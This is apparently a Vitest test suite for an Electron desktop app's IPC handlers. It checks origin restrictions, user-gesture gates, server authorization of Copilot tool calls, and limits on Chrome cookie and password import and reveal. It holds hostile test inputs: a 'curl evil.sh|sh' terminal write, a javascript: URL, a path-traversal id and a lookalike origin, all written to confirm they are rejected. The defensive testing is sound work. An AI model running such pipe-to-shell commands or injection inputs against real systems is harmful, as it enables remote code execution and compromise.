import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { beforeEach, describe, expect, it, vi } from 'vitest'

vi.mock('electron', () => import('@/test/electron-mock'))

// Stubbed so the gating tests never read the developer's real Chrome profile
// or reach their Keychain — the importer's own behaviour is covered by
// src/main/browser-import.
vi.mock('@/main/browser-import', () => ({
  isChromeImportSupported: vi.fn(() => true),
  listChromeImportProfiles: vi.fn(async () => [{ id: 'Default', label: 'Person 1' }]),
  importChromeCookies: vi.fn(async () => ({ cookiesImported: 3, cookiesSkipped: 1 })),
  importChromePasswords: vi.fn(async () => ({
    passwordsAdded: 2,
    passwordsUpdated: 0,
    passwordsSkipped: 1,
  })),
}))

const { mockCoordinator } = vi.hoisted(() => ({
  mockCoordinator: {
    noteFormState: vi.fn(),
    noteNavigation: vi.fn(),
    forget: vi.fn(),
    refreshAvailability: vi.fn(),
    showChooser: vi.fn(async () => true),
  },
}))

vi.mock('@/main/browser-credentials', () => ({
  revealCredential: vi.fn(async () => 'hunter2'),
  copyCredential: vi.fn(async () => true),
  credentialsAvailable: vi.fn(() => true),
  listCredentials: vi.fn(async () => [
    {
      id: 'c1',
      origin: 'https://example.com',
      username: 'ada',
      createdAt: '',
      updatedAt: '',
      source: 'chrome',
    },
  ]),
  forgetCredential: vi.fn(async () => []),
  forgetAllCredentials: vi.fn(async () => []),
  clearCredentials: vi.fn(async () => {}),
  initFillCoordinator: vi.fn(() => mockCoordinator),
  fillCoordinator: vi.fn(() => mockCoordinator),
}))

// A browser tab is identified by WebContents, not by URL — the pages it hosts
// are arbitrary websites.
vi.mock('@/main/browser-agent/registry', () => ({
  registerAgentWebContents: vi.fn(),
  isAgentWebContents: vi.fn(
    (contents: { isBrowserTab?: boolean } | null) => contents?.isBrowserTab === true
  ),
}))

import type { WebContents } from 'electron'
import { ipcMain, shell } from 'electron'
import {
  copyCredential,
  credentialsAvailable,
  forgetAllCredentials,
  forgetCredential,
  listCredentials,
  revealCredential,
} from '@/main/browser-credentials'
import {
  importChromeCookies,
  importChromePasswords,
  listChromeImportProfiles,
} from '@/main/browser-import'
import { trackInputActivity } from '@/main/input-activity'
import { type IpcDeps, registerIpcHandlers } from '@/main/ipc'
import { LocalFilesystemService } from '@/main/local-filesystem'
import { TerminalService } from '@/main/terminal'

const APP = 'https://sim.ai'

type InputListener = (event: unknown, input: { type: string }) => void

interface FakeSender {
  session?: { fetch: (url: string, init?: RequestInit) => Promise<Response> }
  /** Marks a sender the mocked registry recognises as a browser tab. */
  isBrowserTab?: boolean
  isDestroyed?: () => boolean
  on?: (channel: string, listener: InputListener) => void
}

type Handler = (
  event: {
    senderFrame: { url: string; executeJavaScript?: (source: string) => Promise<unknown> } | null
    sender?: FakeSender
  },
  ...args: unknown[]
) => unknown

function collectHandlers() {
  const invoke = new Map<string, Handler>()
  const on = new Map<string, Handler>()
  for (const [channel, handler] of vi.mocked(ipcMain.handle).mock.calls) {
    invoke.set(channel as string, handler as Handler)
  }
  for (const [channel, handler] of vi.mocked(ipcMain.on).mock.calls) {
    on.set(channel as string, handler as Handler)
  }
  return { invoke, on }
}

/**
 * A sender registered with the main-process input tracker, so a test can grant
 * it a real gesture with `press`. User activation is no longer read out of the
 * renderer, so a fixture cannot fake it by stubbing `executeJavaScript`.
 */
function trackedSender() {
  const listeners: InputListener[] = []
  const sender = {
    session: {
      fetch: vi.fn(async () => {
        throw new Error('not authorized')
      }),
    },
    isDestroyed: () => false,
    on: (channel: string, listener: InputListener) => {
      if (channel === 'input-event') listeners.push(listener)
    },
  }
  trackInputActivity(sender as unknown as WebContents)
  return {
    sender,
    /** Delivers one real click, satisfying both input-recency gates. */
    press: () => {
      for (const listener of listeners) listener({}, { type: 'mouseDown' })
    },
  }
}

const rejectedSender = () => trackedSender().sender
const fileSender = rejectedSender()
const appSender = rejectedSender()
const evilSender = rejectedSender()
const activeSender = trackedSender()
const activeChooserSender = trackedSender()
const fileEvent = {
  senderFrame: { url: 'file:///app/static/offline.html' },
  sender: fileSender,
}
const appEvent = { senderFrame: { url: `${APP}/workspace/ws1` }, sender: appSender }
const activeAppEvent = {
  senderFrame: { url: `${APP}/workspace/ws1` },
  sender: activeSender.sender,
}
/** Same origin, but the main process has never seen this renderer get input. */
const inactiveAppEvent = {
  senderFrame: { url: `${APP}/workspace/ws1` },
  sender: rejectedSender(),
}
const evilEvent = { senderFrame: { url: 'https://evil.example/page' }, sender: evilSender }
/** The chooser anchors a native menu, so it needs a sender with a window. */
const FAKE_WINDOW = { id: 'main-window' }
const activeChooserEvent = {
  senderFrame: { url: `${APP}/workspace/ws1` },
  sender: activeChooserSender.sender,
}

describe('registerIpcHandlers', () => {
  let deps: IpcDeps

  beforeEach(() => {
    activeSender.press()
    activeChooserSender.press()
    vi.mocked(ipcMain.handle).mockClear()
    vi.mocked(ipcMain.on).mockClear()
    vi.mocked(shell.openExternal).mockClear()
    vi.mocked(listChromeImportProfiles).mockClear()
    vi.mocked(importChromeCookies).mockClear()
    vi.mocked(importChromePasswords).mockClear()
    vi.mocked(credentialsAvailable).mockClear()
    vi.mocked(listCredentials).mockClear()
    vi.mocked(forgetCredential).mockClear()
    vi.mocked(forgetAllCredentials).mockClear()
    vi.mocked(revealCredential).mockClear()
    vi.mocked(copyCredential).mockClear()
    mockCoordinator.noteFormState.mockClear()
    mockCoordinator.showChooser.mockClear()
    deps = {
      appOrigin: () => APP,
      allowHttpLocalhost: () => false,
      retryLoad: vi.fn(),
      beginOAuthConnect: vi.fn(async () => true),
      localFilesystem: new LocalFilesystemService({
        chooseDirectory: vi.fn(async () => null),
      }),
      terminal: new TerminalService(),
      settings: {
        getPreferences: vi.fn(() => ({
          notificationsEnabled: true,
          notificationSounds: true,
          notificationsOnlyWhenUnfocused: true,
          launchAtLogin: false,
          autoDownloadUpdates: true,
        })),
        setPreference: vi.fn(),
        notify: vi.fn(() => true),
        applySystemPreferences: vi.fn(),
      },
      getWindowState: vi.fn(() => ({ isFullScreen: true })),
      getWindowForContents: vi.fn(() => FAKE_WINDOW as never),
      browserPanel: {
        setBounds: vi.fn(),
        setFocused: vi.fn(),
        setOccluded: vi.fn(),
      },
      updates: {
        getState: vi.fn(() => ({ status: 'ready' as const, version: '1.2.3' })),
        check: vi.fn(),
        install: vi.fn(),
      },
    }
    registerIpcHandlers(deps)
  })

  it('validates open-external URLs regardless of sender', async () => {
    const { invoke } = collectHandlers()
    expect(await invoke.get('desktop:open-external')?.(evilEvent, 'https://docs.sim.ai')).toBe(true)
    expect(await invoke.get('desktop:open-external')?.(appEvent, 'javascript:alert(1)')).toBe(false)
    expect(await invoke.get('desktop:open-external')?.(appEvent, 42)).toBe(false)
    expect(shell.openExternal).toHaveBeenCalledTimes(1)
  })

  it('restricts the OAuth connect handoff to the app origin', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:oauth-connect')
    expect(await handler?.(evilEvent, 'slack')).toBe(false)
    expect(await handler?.(fileEvent, 'slack')).toBe(false)
    expect(deps.beginOAuthConnect).not.toHaveBeenCalled()
    expect(await handler?.(appEvent, 42)).toBe(false)
    expect(await handler?.(appEvent, 'slack')).toBe(true)
    expect(deps.beginOAuthConnect).toHaveBeenCalledWith('slack', {})

    // Chip-initiated connects carry workspace/credential scope; malformed
    // scopes (wrong types, unsafe ids) are rejected before the handoff.
    expect(await handler?.(appEvent, 'slack', { workspaceId: 'ws1', credentialId: 'cred_1' })).toBe(
      true
    )
    expect(deps.beginOAuthConnect).toHaveBeenCalledWith('slack', {
      workspaceId: 'ws1',
      credentialId: 'cred_1',
    })
    expect(await handler?.(appEvent, 'slack', { workspaceId: 'ws/../evil' })).toBe(false)
    expect(await handler?.(appEvent, 'slack', 'not-an-object')).toBe(false)
  })

  it('restricts the updates surface to the app origin', async () => {
    const { invoke, on } = collectHandlers()
    const getState = invoke.get('desktop:updates:get-state')
    expect(await getState?.(evilEvent)).toEqual({ status: 'idle' })
    expect(await getState?.(appEvent)).toEqual({ status: 'ready', version: '1.2.3' })

    on.get('desktop:updates:check')?.(evilEvent)
    on.get('desktop:updates:install')?.(evilEvent)
    expect(deps.updates.check).not.toHaveBeenCalled()
    expect(deps.updates.install).not.toHaveBeenCalled()

    on.get('desktop:updates:check')?.(appEvent)
    on.get('desktop:updates:install')?.(appEvent)
    expect(deps.updates.check).toHaveBeenCalledTimes(1)
    expect(deps.updates.install).toHaveBeenCalledTimes(1)
  })

  it('restricts local filesystem access to the app origin', async () => {
    const { invoke } = collectHandlers()
    expect(
      await invoke.get('desktop:local-filesystem')?.(evilEvent, { operation: 'list_mounts' })
    ).toMatchObject({ ok: false, code: 'ACCESS_DENIED' })
    expect(
      await invoke.get('desktop:local-filesystem')?.(appEvent, { operation: 'list_mounts' })
    ).toEqual({ ok: true, data: { mounts: [] } })
  })

  it('requires an active user gesture for granting or revoking folder access', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:local-filesystem')

    expect(await handler?.(inactiveAppEvent, { operation: 'mount_directory' })).toMatchObject({
      ok: false,
      code: 'ACCESS_DENIED',
      error: expect.stringContaining('explicit user click'),
    })
    expect(await handler?.(activeAppEvent, { operation: 'mount_directory' })).toMatchObject({
      ok: true,
      data: { cancelled: true, mount: null },
    })
    expect(
      await handler?.(inactiveAppEvent, { operation: 'reveal_mount', uri: 'localfs://mount-1/' })
    ).toMatchObject({
      ok: false,
      code: 'ACCESS_DENIED',
      error: expect.stringContaining('explicit user click'),
    })
  })

  it('requires server authorization for every privileged filesystem tool request', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:local-filesystem')
    const handle = vi.spyOn(deps.localFilesystem, 'handle')

    expect(
      await handler?.(appEvent, {
        operation: 'read',
        uri: 'localfs://mount-1/README.md',
        requestId: 'tool-1',
      })
    ).toMatchObject({
      ok: false,
      code: 'ACCESS_DENIED',
      error: expect.stringContaining('authorized pending Copilot tool call'),
    })
    expect(handle).not.toHaveBeenCalled()

    const fetchAuthorization = vi.fn(async () =>
      Response.json({
        toolName: 'read',
        args: { path: 'user-local/Project--mount-1/README.md' },
      })
    )
    const authorizedEvent = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender: { session: { fetch: fetchAuthorization } },
    }
    vi.spyOn(deps.localFilesystem, 'isAuthorizedClientToolRequest').mockReturnValueOnce(true)
    handle.mockResolvedValueOnce({ ok: true, data: { forgotten: false } })

    await expect(
      handler?.(authorizedEvent, {
        operation: 'read',
        uri: 'localfs://mount-1/README.md',
        requestId: 'tool-1',
      })
    ).resolves.toEqual({ ok: true, data: { forgotten: false } })
    expect(fetchAuthorization).toHaveBeenCalledWith(
      `${APP}/api/desktop/tool/authorize`,
      expect.objectContaining({
        method: 'POST',
        credentials: 'include',
        body: JSON.stringify({ toolCallId: 'tool-1' }),
      })
    )
  })

  it('restricts desktop settings to the app origin and validates mutations', async () => {
    const { invoke } = collectHandlers()
    const get = invoke.get('desktop:settings:get')
    const set = invoke.get('desktop:settings:set')
    const notify = invoke.get('desktop:settings:notify')

    expect(await get?.(evilEvent)).toBeNull()
    expect(await get?.(appEvent)).toMatchObject({ notificationsEnabled: true })

    await set?.(evilEvent, 'notificationsEnabled', false)
    await set?.(appEvent, 'not-a-setting', false)
    await set?.(appEvent, 'notificationsEnabled', 'no')
    expect(deps.settings.setPreference).not.toHaveBeenCalled()

    await set?.(appEvent, 'notificationsEnabled', false)
    expect(deps.settings.setPreference).toHaveBeenCalledWith('notificationsEnabled', false)

    expect(await notify?.(evilEvent, { title: 'Done', body: 'Ready' })).toBe(false)
    expect(await notify?.(appEvent, { title: '', body: 'Ready' })).toBe(false)
    expect(
      await notify?.(appEvent, { title: 'Done', body: 'Ready', route: '//evil.example' })
    ).toBe(false)
    expect(deps.settings.notify).not.toHaveBeenCalled()

    expect(
      await notify?.(appEvent, {
        title: 'Task complete',
        body: 'Sim finished responding.',
        route: '/workspace/ws1/chat/c1',
      })
    ).toBe(true)
    expect(deps.settings.notify).toHaveBeenCalledWith({
      title: 'Task complete',
      body: 'Sim finished responding.',
      route: '/workspace/ws1/chat/c1',
    })
  })

  it('reports native fullscreen state only to the app origin', async () => {
    const { invoke } = collectHandlers()
    const getWindowState = invoke.get('desktop:window-state:get')

    expect(await getWindowState?.(evilEvent)).toEqual({ isFullScreen: false })
    expect(await getWindowState?.(appEvent)).toEqual({ isFullScreen: true })
    expect(deps.getWindowState).toHaveBeenCalledWith(appSender)
  })

  it('restricts shell-control channels to bundled local pages', () => {
    const { on } = collectHandlers()

    on.get('offline:retry')?.(appEvent)
    expect(deps.retryLoad).not.toHaveBeenCalled()
    on.get('offline:retry')?.(fileEvent)
    expect(deps.retryLoad).toHaveBeenCalledWith(fileSender)
  })

  it('registers every channel the preload bridge invokes or sends', () => {
    // The two files share ~20 channel names as bare string literals with
    // nothing tying them together, so a typo on either side is a silently dead
    // feature that type-checks, lints, and ships.
    const { invoke, on } = collectHandlers()
    const registered = new Set([...invoke.keys(), ...on.keys()])
    const preloadSource = readFileSync(
      fileURLToPath(new URL('../preload/index.ts', import.meta.url)),
      'utf8'
    )
    const used = [
      ...new Set(
        [...preloadSource.matchAll(/ipcRenderer\.(?:invoke|send)\(\s*'([^']+)'/g)].map(
          (match) => match[1]
        )
      ),
    ]

    expect(used.length).toBeGreaterThan(0)
    expect(used.filter((channel) => !registered.has(channel))).toEqual([])
  })

  it('compares the sender by parsed origin, not by prefix', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('desktop:settings:get')

    // A lookalike host is a prefix of the app origin, so a `startsWith` gate
    // is one missing trailing slash away from admitting it.
    const lookalike = { senderFrame: { url: `${APP}.evil.example/workspace/ws1` } }
    expect(await handler?.(lookalike)).toBeNull()

    // Origin equality also normalizes the default port, which a prefix
    // comparison rejects even though it is the same origin.
    const explicitPort = { senderFrame: { url: 'https://sim.ai:443/workspace/ws1' } }
    expect(await handler?.(explicitPort)).toMatchObject({ notificationsEnabled: true })
  })

  it('handles a missing senderFrame safely', async () => {
    const { invoke } = collectHandlers()
    expect(await invoke.get('desktop:oauth-connect')?.({ senderFrame: null }, 'slack')).toBe(false)
    expect(deps.beginOAuthConnect).not.toHaveBeenCalled()
  })

  it('restricts browser-agent tool execution to the app origin and known tools', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-agent:execute-tool')

    expect(
      await handler?.(evilEvent, 'tool-1', 'browser_navigate', { url: 'https://x.dev' })
    ).toMatchObject({
      ok: false,
      error: expect.stringContaining('not allowed'),
    })
    expect(await handler?.(fileEvent, 'tool-1', 'browser_navigate', {})).toMatchObject({
      ok: false,
    })
    expect(await handler?.(appEvent, 'tool-1', 'browser_snapshot', {})).toMatchObject({
      ok: false,
      error: expect.stringContaining('authorized pending Copilot tool call'),
    })

    const fetchAuthorization = vi.fn(async () =>
      Response.json({ toolName: 'browser_snapshot', args: {} })
    )
    const authorizedEvent = {
      senderFrame: { url: `${APP}/workspace/ws1` },
      sender: { session: { fetch: fetchAuthorization } },
    }
    // The server-persisted name must match the renderer's requested name.
    expect(
      await handler?.(authorizedEvent, 'tool-1', 'browser_navigate', {
        url: 'https://evil.example',
      })
    ).toMatchObject({
      ok: false,
      error: expect.stringContaining('authorized pending Copilot tool call'),
    })
    // An authorized call reaches the driver with the server-persisted args
    // (which reports its own tool-level failure because no session exists).
    expect(
      await handler?.(authorizedEvent, 'tool-1', 'browser_snapshot', {
        ignored: 'renderer cannot choose params',
      })
    ).toMatchObject({
      ok: false,
      error: expect.stringContaining('No page is open yet'),
    })
    expect(fetchAuthorization).toHaveBeenCalledWith(
      `${APP}/api/desktop/tool/authorize`,
      expect.objectContaining({ body: JSON.stringify({ toolCallId: 'tool-1' }) })
    )
  })

  it('ignores browser-agent panel actions from outside the app origin', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:panel-action')
    // Malformed and foreign-origin actions are dropped without throwing.
    expect(() => handler?.(evilEvent, { action: 'reload' })).not.toThrow()
    expect(() => handler?.(appEvent, 'not-an-object')).not.toThrow()
    expect(() => handler?.(appEvent, { action: 'reload' })).not.toThrow()
  })

  it('restricts browser-tab pinning to typed app-origin messages', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:set-tab-pinned')

    expect(() => handler?.(evilEvent, '1', true)).not.toThrow()
    expect(() => handler?.(appEvent, 1, true)).not.toThrow()
    expect(() => handler?.(appEvent, '1', 'yes')).not.toThrow()
    expect(() => handler?.(appEvent, '1', true)).not.toThrow()
  })

  it('restricts browser-tab reordering to typed app-origin messages', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:reorder-tab')

    expect(() => handler?.(evilEvent, '1', 0)).not.toThrow()
    expect(() => handler?.(appEvent, 1, 0)).not.toThrow()
    expect(() => handler?.(appEvent, '1', '0')).not.toThrow()
    expect(() => handler?.(appEvent, '1', Number.NaN)).not.toThrow()
    expect(() => handler?.(appEvent, '1', 0)).not.toThrow()
  })

  it('restricts browser-panel occlusion updates to boolean app-origin messages', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:set-panel-occluded')

    expect(() => handler?.(evilEvent, true)).not.toThrow()
    expect(() => handler?.(appEvent, 'yes')).not.toThrow()
    expect(() => handler?.(appEvent, true)).not.toThrow()
    expect(deps.browserPanel.setOccluded).toHaveBeenCalledWith(appSender, true)
  })

  it('restricts browser-panel focus updates to boolean app-origin messages', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:set-panel-focused')

    expect(() => handler?.(evilEvent, true)).not.toThrow()
    expect(() => handler?.(appEvent, 'yes')).not.toThrow()
    expect(() => handler?.(appEvent, true)).not.toThrow()
    expect(deps.browserPanel.setFocused).toHaveBeenCalledWith(appSender, true)
  })

  it('routes validated browser-panel bounds with the originating app window sender', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:set-panel-bounds')
    const bounds = { x: 100, y: 50, width: 800, height: 600 }

    handler?.(evilEvent, bounds)
    handler?.(appEvent, { ...bounds, width: Number.NaN })
    expect(deps.browserPanel.setBounds).not.toHaveBeenCalled()

    handler?.(appEvent, bounds)
    handler?.(appEvent, null)
    expect(deps.browserPanel.setBounds).toHaveBeenNthCalledWith(1, appSender, bounds, undefined)
    expect(deps.browserPanel.setBounds).toHaveBeenNthCalledWith(2, appSender, null, undefined)
  })

  it('forwards a well-formed panel anchor and drops a malformed one', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:set-panel-bounds')
    const bounds = { x: 100, y: 50, width: 800, height: 600 }
    const anchor = { viewportWidth: 1600, viewportHeight: 900, widthRatio: 0.5 }

    handler?.(appEvent, bounds, anchor)
    expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(appSender, bounds, anchor)

    // A bad anchor must not take the bounds down with it — the rect still
    // applies, the shell just loses the resize optimization.
    handler?.(appEvent, bounds, { ...anchor, widthRatio: Number.NaN })
    expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(appSender, bounds, undefined)
    handler?.(appEvent, bounds, { ...anchor, viewportWidth: 0 })
    expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(appSender, bounds, undefined)
    handler?.(appEvent, bounds, 'nonsense')
    expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(appSender, bounds, undefined)
  })

  it('restricts browser theme updates to known app-origin preferences', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-agent:set-theme')

    expect(() => handler?.(evilEvent, 'dark')).not.toThrow()
    expect(() => handler?.(appEvent, 'sepia')).not.toThrow()
    expect(() => handler?.(appEvent, 'system')).not.toThrow()
  })

  it('restricts Chrome profile discovery to the app origin', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-import:list-profiles')

    expect(await handler?.(evilEvent)).toEqual([])
    expect(await handler?.(fileEvent)).toEqual([])
    expect(listChromeImportProfiles).not.toHaveBeenCalled()

    expect(await handler?.(appEvent)).toEqual([{ id: 'Default', label: 'Person 1' }])
  })

  it('requires a live user gesture before importing Chrome cookies', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-import:cookies')

    // Reading someone's Chrome cookies is a user decision. Without an active
    // gesture the call is refused before it can reach the Keychain, so a
    // scripted or compromised renderer cannot start an import on its own.
    expect(await handler?.(inactiveAppEvent, 'Default')).toEqual({
      cookiesImported: 0,
      cookiesSkipped: 0,
      error: 'unknown',
    })
    expect(importChromeCookies).not.toHaveBeenCalled()

    expect(await handler?.(activeAppEvent, 'Default')).toEqual({
      cookiesImported: 3,
      cookiesSkipped: 1,
    })
    expect(importChromeCookies).toHaveBeenCalledWith('Default')
  })

  it('never imports Chrome cookies for a foreign origin', async () => {
    const { invoke } = collectHandlers()

    expect(await invoke.get('browser-import:cookies')?.(evilEvent, 'Default')).toMatchObject({
      error: 'unknown',
    })
    expect(importChromeCookies).not.toHaveBeenCalled()
  })

  it('refuses Chrome import while the browser surface is switched off', async () => {
    deps.settings.getPreferences = vi.fn(() => ({
      notificationsEnabled: true,
      notificationSounds: true,
      notificationsOnlyWhenUnfocused: true,
      launchAtLogin: false,
      autoDownloadUpdates: true,
      browserEnabled: false,
    }))
    const { invoke } = collectHandlers()

    expect(await invoke.get('browser-import:list-profiles')?.(appEvent)).toEqual([])
    expect(await invoke.get('browser-import:cookies')?.(activeAppEvent, 'Default')).toMatchObject({
      error: 'unknown',
    })
    expect(listChromeImportProfiles).not.toHaveBeenCalled()
    expect(importChromeCookies).not.toHaveBeenCalled()
  })

  it('refuses a malformed profile id rather than importing the default profile', async () => {
    const { invoke } = collectHandlers()

    expect(await invoke.get('browser-import:cookies')?.(activeAppEvent, 42)).toEqual({
      cookiesImported: 0,
      cookiesSkipped: 0,
      error: 'unknown',
    })
    expect(importChromeCookies).not.toHaveBeenCalled()
  })

  it('imports the default profile when the page names none', async () => {
    const { invoke } = collectHandlers()

    await invoke.get('browser-import:cookies')?.(activeAppEvent, undefined)
    expect(importChromeCookies).toHaveBeenCalledWith(undefined)
  })

  it('exposes exactly one channel that can return a password', async () => {
    // The structural guarantee behind the credential design. Reveal is the one
    // deliberate exception, so the channel list is pinned here: a new way to
    // get plaintext out of the main process has to break this test first.
    const { invoke, on } = collectHandlers()
    const credentialChannels = [...invoke.keys(), ...on.keys()].filter((channel) =>
      channel.startsWith('browser-credentials:')
    )

    expect(credentialChannels.sort()).toEqual([
      'browser-credentials:available',
      'browser-credentials:copy',
      'browser-credentials:forget',
      'browser-credentials:forget-all',
      'browser-credentials:form-state',
      'browser-credentials:import',
      'browser-credentials:list',
      'browser-credentials:reveal',
      'browser-credentials:show-chooser',
    ])

    const listed = (await invoke.get('browser-credentials:list')?.(appEvent)) as Array<
      Record<string, unknown>
    >
    expect(listed.every((credential) => !('password' in credential))).toBe(true)
  })

  it('requires origin and a live gesture before revealing or copying a password', async () => {
    const { invoke } = collectHandlers()
    const revealHandler = invoke.get('browser-credentials:reveal')
    const copyHandler = invoke.get('browser-credentials:copy')

    expect(await revealHandler?.(evilEvent, 'c1')).toBeNull()
    expect(await revealHandler?.(inactiveAppEvent, 'c1')).toBeNull()
    expect(await copyHandler?.(evilEvent, 'c1')).toBe(false)
    expect(await copyHandler?.(inactiveAppEvent, 'c1')).toBe(false)
    expect(revealCredential).not.toHaveBeenCalled()
    expect(copyCredential).not.toHaveBeenCalled()

    expect(await revealHandler?.(activeAppEvent, 'c1')).toBe('hunter2')
    expect(revealCredential).toHaveBeenCalledWith('c1')
  })

  it('requires a live user gesture before deleting every password', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-credentials:forget-all')

    expect(await handler?.(evilEvent)).toEqual([])
    expect(await handler?.(inactiveAppEvent)).toEqual([])
    expect(forgetAllCredentials).not.toHaveBeenCalled()

    await handler?.(activeAppEvent)
    expect(forgetAllCredentials).toHaveBeenCalled()
  })

  it('refuses a reveal for anything that is not a credential id', async () => {
    const { invoke } = collectHandlers()

    expect(
      await invoke.get('browser-credentials:reveal')?.(activeAppEvent, { id: 'c1' })
    ).toBeNull()
    expect(revealCredential).not.toHaveBeenCalled()
  })

  it('accepts login-form reports only from the built-in browseritself', async () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-credentials:form-state')
    const report = { origin: 'https://example.com', hasLoginForm: true }
    const browserPageEvent = {
      senderFrame: { url: 'https://example.com/login' },
      sender: { isBrowserTab: true },
    }

    // An arbitrary website, and even the Sim app itself, cannot claim a page
    // has a login form — only the browser tab's own preload can.
    handler?.(evilEvent, report)
    handler?.(appEvent, report)
    expect(mockCoordinator.noteFormState).not.toHaveBeenCalled()

    handler?.(browserPageEvent, report)
    expect(mockCoordinator.noteFormState).toHaveBeenCalledWith(browserPageEvent.sender, report)
  })

  it('ignores a malformed login-form report', () => {
    const { on } = collectHandlers()
    const handler = on.get('browser-credentials:form-state')
    const browserPageEvent = {
      senderFrame: { url: 'https://x.test/' },
      sender: { isBrowserTab: true },
    }

    handler?.(browserPageEvent, 'nonsense')
    handler?.(browserPageEvent, { origin: 42, hasLoginForm: true })
    handler?.(browserPageEvent, { origin: 'https://x.test', hasLoginForm: 'yes' })

    expect(mockCoordinator.noteFormState).not.toHaveBeenCalled()
  })

  it('requires a live user gesture before opening the credential chooser', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-credentials:show-chooser')
    const anchor = { x: 10, y: 20 }

    expect(await handler?.(evilEvent, anchor)).toBe(false)
    expect(await handler?.(inactiveAppEvent, anchor)).toBe(false)
    expect(mockCoordinator.showChooser).not.toHaveBeenCalled()

    expect(await handler?.(activeChooserEvent, anchor)).toBe(true)
    expect(mockCoordinator.showChooser).toHaveBeenCalledWith(FAKE_WINDOW, anchor)
  })

  it('refuses a chooser anchor that is not a real point', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-credentials:show-chooser')

    expect(await handler?.(activeChooserEvent, { x: 'left', y: 2 })).toBe(false)
    expect(await handler?.(activeChooserEvent, { x: Number.NaN, y: 2 })).toBe(false)
    expect(await handler?.(activeChooserEvent, null)).toBe(false)
    expect(mockCoordinator.showChooser).not.toHaveBeenCalled()
  })

  it('requires a live user gesture before importing or forgetting passwords', async () => {
    const { invoke } = collectHandlers()

    expect(
      await invoke.get('browser-credentials:import')?.(inactiveAppEvent, 'Default')
    ).toMatchObject({ error: 'unknown' })
    await invoke.get('browser-credentials:forget')?.(inactiveAppEvent, 'c1')
    expect(importChromePasswords).not.toHaveBeenCalled()
    expect(forgetCredential).not.toHaveBeenCalled()

    await invoke.get('browser-credentials:import')?.(activeAppEvent, 'Default', 'replace')
    await invoke.get('browser-credentials:forget')?.(activeAppEvent, 'c1')
    expect(importChromePasswords).toHaveBeenCalledWith('Default', 'replace')
    expect(forgetCredential).toHaveBeenCalledWith('c1')
  })

  it('accepts a terminal write only after the main process has seen real input', () => {
    const { on } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})

    on.get('terminal:write')?.(inactiveAppEvent, 't1', 'curl evil.sh|sh\r')
    expect(write).not.toHaveBeenCalled()

    on.get('terminal:write')?.(activeAppEvent, 't1', 'ls\r')
    expect(write).toHaveBeenCalledWith('t1', 'ls\r')
  })

  it('defaults password conflicts to keeping what is already stored', async () => {
    const { invoke } = collectHandlers()

    await invoke.get('browser-credentials:import')?.(activeAppEvent, undefined, 'nonsense')
    expect(importChromePasswords).toHaveBeenCalledWith(undefined, 'keep-existing')
  })

  it('reports credential availability only to the app origin', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-credentials:available')

    expect(await handler?.(evilEvent)).toBe(false)
    expect(credentialsAvailable).not.toHaveBeenCalled()
    expect(await handler?.(appEvent)).toBe(true)
  })

  it('never lists credentials to a foreign origin', async () => {
    const { invoke } = collectHandlers()

    expect(await invoke.get('browser-credentials:list')?.(evilEvent)).toEqual([])
    expect(listCredentials).not.toHaveBeenCalled()
  })
})
